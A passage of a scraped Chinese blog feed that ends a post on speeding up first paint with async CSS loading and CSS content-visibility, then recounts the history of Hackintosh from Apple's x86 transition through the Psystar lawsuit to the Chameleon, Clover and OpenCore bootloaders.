href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 